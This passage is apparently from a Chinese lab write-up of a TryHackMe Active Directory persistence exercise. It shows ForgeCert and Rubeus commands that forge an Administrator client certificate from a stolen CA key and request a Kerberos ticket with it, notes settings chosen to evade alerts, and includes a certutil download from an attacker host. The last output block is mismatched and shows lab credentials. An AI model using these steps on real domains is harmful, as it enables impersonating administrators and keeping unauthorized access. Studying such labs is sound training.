<p>弄了半天是我ssh连接对象搞错了</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226175500376.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226175500376.png" alt="image-20240226175500376"></p>
<h2 id="生成我们自己的证书"><a href="#生成我们自己的证书" class="headerlink" title="生成我们自己的证书"></a>生成我们自己的证书</h2>
<p>现在我们有了私钥和根 CA 证书，我们可以使用 SpectorOps <a target="_blank" rel="noopener" href="https://github.com/GhostPack/ForgeCert">ForgeCert</a> 工具为我们想要的任何用户伪造客户端身份验证证书。 ForgeCert 和 Rubeus 二进制文件存储在 THMWRK1 上的 C:\Tools\ 目录中。让我们使用 ForgeCert 生成一个新证书：</p>
<p>这里我们需要将上述的pfx文件传输到我们的attackbox上</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">scp Administrator<span class="hljs-keyword">@thmdc</span>.za.tryhackme.<span class="hljs-attribute">loc</span>:<span class="hljs-attribute">C</span>:/Users/Administrator/hybcx/local_machine_My_1_za-THMDC-CA.pfx .<br></code></pre></td></tr></table></figure>
<p>接着ssh连接该域环境的thmwrk计算机，将该pfx文件传输至该计算机上</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194150775.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194150775.png" alt="image-20240226194150775"></p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194157209.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194157209.png" alt="image-20240226194157209"></p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">certutil -urlcache -f http://<span class="hljs-number">10.50</span>.<span class="hljs-number">59.120</span>:<span class="hljs-number">8000</span>/za-THMDC-CA.pfx za-THMDC-CA.pfx<br></code></pre></td></tr></table></figure>
<p>接下来使用工具生成证书</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123<br>    <br>    C:\Tools\ForgeCert\ForgeCert\ForgeCert.exe --CaCertPath local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194610334.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226194610334.png" alt></p>
<p>参数解释：</p>
<ul>
<li>CaCertPath - 我们导出的 CA 证书的路径。</li>
<li>CaCertPassword - 用于加密证书的密码。默认情况下，Mimikatz 分配的密码为 <code>mimikatz</code> 。</li>
<li>Subject - 证书的主题或通用名称。对于我们使用证书的用途而言，这并不重要。</li>
<li>subjectAltName - 这是我们要使用此证书模拟的帐户的用户主体名称 (UPN)。它必须是合法用户。</li>
<li>NewCertPath - ForgeCert 将存储生成的证书的路径。</li>
<li>NewCertPassword - 由于证书需要导出私钥用于身份验证，因此我们必须设置一个用于加密它的新密码。</li>
</ul>
<p>我们可以使用 Rubeus 来使用证书请求 TGT，以验证证书是否可信。我们将使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:fullAdmin.kirbi /domain:za.tryhackme.loc /dc:<span class="hljs-number">10.200</span>.<span class="hljs-number">62.101</span><br><br>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:hybcx /outfile:fullAdmin.kirbi /domain:za.tryhackme.loc /dc:<span class="hljs-number">10.200</span>.<span class="hljs-number">62.101</span><br></code></pre></td></tr></table></figure>
<p>我们来分解一下参数：</p>
<ul>
<li>/user - 这指定我们将模拟的用户，并且必须与我们生成的证书的 UPN 相匹配</li>
<li>/enctype - 指定票证的加密类型。设置此项对于规避很重要，因为默认加密算法很弱，这会导致溢出警报</li>
<li>/certificate - 我们生成的证书的路径</li>
<li>/password - 我们的证书文件的密码</li>
<li>/outfile - TGT 将输出到的文件</li>
<li>/domain - 我们当前攻击的域的 FQDN</li>
<li>/dc - 我们请求 TGT 的域控制器的 IP。通常，最好选择运行CA服务的DC</li>
</ul>
<p>执行命令后，我们应该会收到 TGT：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"> <br>Your credentials have been generated: Username: louis.thornton Password: Islr3423 <br></code></pre></td></tr></table></figure>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/02/26/%E6%B5%85%E6%9E%90XXE%E6%BC%8F%E6%B4%9E-Java/">← 下一篇 浅析xxe漏洞-Java</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/02/16/THM-Nmap/">THM-Nmap 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AD-%E7%BB%B4%E6%8C%81"><span class="toc-number">1.1.</span> <span class="toc-text">AD 维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-number">1.2.</span> <span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B4%A2%E5%8F%96%E6%82%A8%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-number">1.3.</span> <span class="toc-text">索取您的凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 通过凭证进行持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%AD%E5%96%9C%E4%BD%A0"><span class="toc-number">2.1.</span> <span class="toc-text">恭喜你</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DC-Sync%EF%BC%88%E5%90%8C%E6%AD%A5%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">DC Sync（同步）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%B6%E9%9D%9E%E6%89%80%E6%9C%89%E5%87%AD%E8%AF%81%E9%83%BD%E6%98%AF%E4%B8%80%E6%A0%B7%E7%9A%84"><span class="toc-number">2.3.</span> <span class="toc-text">并非所有凭证都是一样的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DC%E5%90%8C%E6%AD%A5%E5%85%A8%E9%83%A8"><span class="toc-number">2.4.</span> <span class="toc-text">DC同步全部</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 通过票据持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A7%E5%85%8B%E5%8A%9B%E5%B7%A5%E5%8E%82%E9%97%A8%E7%A5%A8"><span class="toc-number">3.1.</span> <span class="toc-text">巧克力工厂门票</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.2.</span> <span class="toc-text">黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.3.</span> <span class="toc-text">白银票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E9%97%A8%E7%A5%A8%E4%BB%A5%E8%8E%B7%E5%8F%96%E4%B9%90%E8%B6%A3%E5%92%8C%E5%88%A9%E6%B6%A6"><span class="toc-number">3.4.</span> <span class="toc-text">伪造门票以获取乐趣和利润</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 通过证书进行持久化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AD-CS%E5%9B%9E%E5%BD%92"><span class="toc-number">4.1.</span> <span class="toc-text">AD CS回归</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E7%A7%81%E9%92%A5"><span class="toc-number">4.2.</span> <span class="toc-text">提取私钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%88%91%E4%BB%AC%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AF%81%E4%B9%A6"><span class="toc-number">4.3.</span> <span class="toc-text">生成我们自己的证书</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>